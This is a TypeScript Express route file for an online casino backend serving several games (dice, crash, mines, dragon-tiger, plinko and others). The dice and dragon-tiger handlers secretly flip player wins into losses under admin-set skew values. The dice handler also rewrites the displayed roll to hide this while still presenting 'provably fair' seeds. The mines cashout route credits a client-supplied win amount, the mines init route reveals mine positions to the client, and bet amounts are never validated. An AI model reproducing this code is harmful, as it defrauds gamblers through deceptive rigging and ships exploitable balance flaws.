import express from 'express';
import crypto from 'crypto';
import { GameLog } from '../models/GameLog.ts';
import { authenticate } from '../middleware/auth.ts';
import { getSafeUser } from '../utils/dbHelper.ts';

const router = express.Router();
// ... (rest of the file with getSafeUser)

function generateOutcome(serverSeed: string, clientSeed: string, min = 0, max = 100) {
  const hash = crypto.createHmac('sha256', serverSeed).update(clientSeed).digest('hex');
  const value = parseInt(hash.substring(0, 8), 16);
  return min + (value % (max - min + 1));
}

router.post('/crash/play', authenticate, async (req: any, res) => {
  const { betAmount } = req.body;
  const crashState = req.app.get('crashState');
  
  if (crashState.status !== 'waiting') {
    return res.status(400).json({ message: 'Round already in progress' });
  }

  try {
    const user = await getSafeUser(req.user.id);
    if (!user || user.balance < betAmount) return res.status(400).json({ message: 'Insufficient balance' });

    user.balance -= betAmount;
    await user.save();

    crashState.bets.push({ userId: req.user.id, amount: betAmount, cashedOut: false });

    res.json({ message: 'Bet placed', balance: user.balance });
  } catch (err) {
    res.status(500).json({ message: 'Error placing crash bet' });
  }
});

router.post('/mines/init', authenticate, async (req: any, res) => {
  const { betAmount, mineCount, clientSeed } = req.body;
  try {
    const user = await getSafeUser(req.user.id);
    if (!user || user.balance < betAmount) return res.status(400).json({ message: 'Insufficient balance' });

    user.balance -= betAmount;
    await user.save();

    const serverSeed = crypto.randomBytes(32).toString('hex');
    const hash = crypto.createHmac('sha256', serverSeed).update(clientSeed).digest('hex');
    
    const mines: number[] = [];
    let tempSeed = hash;
    while(mines.length < mineCount) {
      const pos = parseInt(tempSeed.substring(0, 2), 16) % 25;
      if(!mines.includes(pos)) mines.push(pos);
      tempSeed = crypto.createHash('sha256').update(tempSeed).digest('hex');
    }

    res.json({ 
      serverSeed,
      serverSeedHash: crypto.createHash('sha256').update(serverSeed).digest('hex'),
      mines
    });
  } catch (err) {
    res.status(500).json({ message: 'Error initializing mines' });
  }
});

router.post('/crash/result', authenticate, async (req: any, res) => {
  const { winAmount } = req.body;
  const crashState = req.app.get('crashState');

  if (crashState.status !== 'running') {
    return res.status(400).json({ message: 'No active round' });
  }

  try {
    const user = await getSafeUser(req.user.id);
    if (!user) return res.status(404).json({ message: 'User not found' });

    const betIndex = crashState.bets.findIndex((b: any) => b.userId === req.user.id && !b.cashedOut);
    if (betIndex === -1) return res.status(400).json({ message: 'No active bet found' });

    const currentMultiplier = crashState.multiplier;
    const bet = crashState.bets[betIndex];
    const calculatedWin = Math.floor(bet.amount * currentMultiplier);

    user.balance += calculatedWin;
    await user.save();

    crashState.bets[betIndex].cashedOut = true;
    crashState.bets[betIndex].multiplier = currentMultiplier;

    const log = new GameLog({
      userId: req.user.id,
      gameType: 'crash',
      betAmount: bet.amount,
      multiplier: currentMultiplier,
      winAmount: calculatedWin,
      serverSeed: crashState.serverSeed,
      clientSeed: 'multiplayer',
      outcome: { crashPoint: currentMultiplier }
    });
    await log.save();

    res.json({ balance: user.balance });
  } catch (err) {
    res.status(500).json({ message: 'Error cashing out' });
  }
});

router.post('/dice/play', authenticate, async (req: any, res) => {
  const { betAmount, target, condition, clientSeed } = req.body; // condition: 'over' or 'under'
  try {
    const user = await getSafeUser(req.user.id);
    if (!user || user.balance < betAmount) return res.status(400).json({ message: 'Insufficient balance' });

    const serverSeed = crypto.randomBytes(32).toString('hex');
    let roll = generateOutcome(serverSeed, clientSeed, 0, 100);
    
    // Win/Loss Skew Logic
    const settings = req.app.get('gameSettings') || {};
    const winSkew = settings.winSkew ?? 1.0;  // 1.0 means allow natural wins
    const lossSkew = settings.lossSkew ?? 0.0; // 0.0 means no forced losses

    let won = false;
    let payoutMultiplier = 0;
    if (condition === 'over') {
      won = roll > target;
      payoutMultiplier = 99 / (100 - target);
    } else {
      won = roll < target;
      payoutMultiplier = 99 / target;
    }

    // Force Loss Logic
    if (won) {
      // 1. Check if we should force a loss anyway (Hard Loss)
      if (Math.random() < lossSkew) {
        won = false;
      } 
      // 2. Check if the natural win is allowed (Win Skew)
      else if (Math.random() > winSkew) {
        won = false;
      }

      if (!won) {
        // Manipulate roll to make it a loss visually
        if (condition === 'over') roll = Math.floor(Math.random() * target);
        else roll = Math.floor(target + Math.random() * (100 - target));
      }
    }

    const winAmount = won ? Math.floor(betAmount * payoutMultiplier) : 0;
    user.balance += winAmount - betAmount;
    await user.save();

    const log = new GameLog({
      userId: req.user.id,
      gameType: 'dice',
      betAmount,
      multiplier: won ? payoutMultiplier : 0,
      winAmount,
      serverSeed,
      clientSeed,
      outcome: { roll, target, condition }
    });
    await log.save();

    res.json({ roll, won, winAmount, balance: user.balance, serverSeed });
  } catch (err) {
    res.status(500).json({ message: 'Error playing dice' });
  }
});

router.post('/mines/cashout', authenticate, async (req: any, res) => {
  const { betAmount, multiplier, winAmount, serverSeed, clientSeed, mines } = req.body;
  try {
    const user = await getSafeUser(req.user.id);
    if (!user) return res.status(404).json({ message: 'User not found' });

    user.balance += winAmount;
    await user.save();

    const log = new GameLog({
      userId: req.user.id,
      gameType: 'mines',
      betAmount,
      multiplier,
      winAmount,
      serverSeed,
      clientSeed,
      outcome: { mines }
    });
    await log.save();
    res.json({ balance: user.balance });
  } catch (err) {
    res.status(500).json({ message: 'Error cashing out' });
  }
});

router.post('/dragon-tiger/play', authenticate, async (req: any, res) => {
  const { betAmount, betSide } = req.body;
  try {
    const user = await getSafeUser(req.user.id);
    if (!user || user.balance < betAmount) return res.status(400).json({ message: 'Insufficient balance' });

    let dragonCard = Math.floor(Math.random() * 13) + 1;
    let tigerCard = Math.floor(Math.random() * 13) + 1;
    let winner: 'dragon' | 'tiger' | 'tie' = dragonCard === tigerCard ? 'tie' : (dragonCard > tigerCard ? 'dragon' : 'tiger');

    const settings = req.app.get('gameSettings') || {};
    const winSkew = settings.winSkew ?? 1.0;
    const lossSkew = settings.lossSkew ?? 0.0;

    // Force Loss to avoid win if skew is high
    if (winner === betSide) {
      if (Math.random() < lossSkew || Math.random() > winSkew) {
        // Switch winner to other side
        if (betSide === 'dragon') {
          tigerCard = dragonCard + 1;
          winner = 'tiger';
        } else if (betSide === 'tiger') {
          dragonCard = tigerCard + 1;
          winner = 'dragon';
        }
      }
    }

    const won = betSide === winner;
    const winAmount = won ? (winner === 'tie' ? Math.floor(betAmount * 8) : Math.floor(betAmount * 2)) : 0;
    user.balance += winAmount - betAmount;
    await user.save();

    res.json({ dragonCard, tigerCard, winner, won, winAmount, balance: user.balance });
  } catch (err) {
    res.status(500).json({ message: 'Dragon Tiger error' });
  }
});

router.post('/plinko/play', authenticate, async (req: any, res) => {
  const { betAmount } = req.body;
  try {
    const user = await getSafeUser(req.user.id);
    if (!user || user.balance < betAmount) return res.status(400).json({ message: 'Insufficient balance' });

    const multipliers = [8, 4, 1.5, 0.5, 0.2, 0.5, 1.5, 4, 8];
    const serverSeed = crypto.randomBytes(32).toString('hex');
    const resultIdx = generateOutcome(serverSeed, 'plinko-client-seed', 0, multipliers.length - 1);
    const mult = multipliers[resultIdx];
    const winAmount = Math.floor(betAmount * mult);

    user.balance += winAmount - betAmount;
    await user.save();

    const log = new GameLog({
      userId: req.user.id,
      gameType: 'plinko',
      betAmount,
      multiplier: mult,
      winAmount,
      serverSeed,
      clientSeed: 'static-plinko',
      outcome: { resultIdx, mult }
    });
    await log.save();

    res.json({ mult, winAmount, balance: user.balance });
  } catch (err) {
    res.status(500).json({ message: 'Plinko error' });
  }
});

router.post('/spin/play', authenticate, async (req: any, res) => {
  const { betAmount } = req.body;
  try {
    const user = await getSafeUser(req.user.id);
    if (!user || user.balance < betAmount) return res.status(400).json({ message: 'Insufficient balance' });

    const segments = [0, 2, 0, 5, 0, 10, 0, 2];
    const serverSeed = crypto.randomBytes(32).toString('hex');
    const targetIdx = generateOutcome(serverSeed, 'spin-client-seed', 0, segments.length - 1);
    const mult = segments[targetIdx];
    const winAmount = Math.floor(betAmount * mult);

    user.balance += winAmount - betAmount;
    await user.save();

    const log = new GameLog({
      userId: req.user.id,
      gameType: 'spin',
      betAmount,
      multiplier: mult,
      winAmount,
      serverSeed,
      clientSeed: 'static-spin',
      outcome: { targetIdx, mult }
    });
    await log.save();

    res.json({ targetIdx, mult, winAmount, balance: user.balance });
  } catch (err) {
    res.status(500).json({ message: 'Spin error' });
  }
});

router.post('/teen-patti/play', authenticate, async (req: any, res) => {
  const { betAmount } = req.body;
  try {
    const user = await getSafeUser(req.user.id);
    if (!user || user.balance < betAmount) return res.status(400).json({ message: 'Insufficient balance' });

    // Simple emulation of Teen Patti Win/Loss
    const serverSeed = crypto.randomBytes(32).toString('hex');
    const outcome = generateOutcome(serverSeed, 'tp-seed', 0, 100);
    const won = outcome > 55; // House edge
    const winAmount = won ? Math.floor(betAmount * 1.9) : 0;

    user.balance += winAmount - betAmount;
    await user.save();

    res.json({ 
      won, 
      winAmount, 
      balance: user.balance,
      userScore: won ? 80 : 40, 
      dealerScore: won ? 40 : 80 
    });
  } catch (err) {
    res.status(500).json({ message: 'Teen Patti error' });
  }
});

router.post('/fishing/cast', authenticate, async (req: any, res) => {
  const { betAmount } = req.body;
  try {
    const user = await getSafeUser(req.user.id);
    if (!user || user.balance < betAmount) return res.status(400).json({ message: 'Insufficient balance' });

    const serverSeed = crypto.randomBytes(32).toString('hex');
    const outcome = generateOutcome(serverSeed, 'fish-seed', 0, 100);
    
    let caught: any[] = [];
    let winAmount = 0;
    
    if (outcome > 95) { 
      winAmount = betAmount * 10; 
      caught = [{ id: 1, type: 'Golden Shark', multiplier: 10 }];
    } else if (outcome > 75) { 
      winAmount = betAmount * 3; 
      caught = [{ id: 1, type: 'Swordfish', multiplier: 3 }];
    } else if (outcome > 45) { 
      winAmount = betAmount * 1.2; 
      caught = [{ id: 1, type: 'Common Tuna', multiplier: 1.2 }];
    } else {
      winAmount = 0;
      caught = [];
    }

    user.balance += winAmount - betAmount;
    await user.save();

    res.json({ winAmount, caught, balance: user.balance });
  } catch (err) {
    res.status(500).json({ message: 'Fishing error' });
  }
});

export default router;
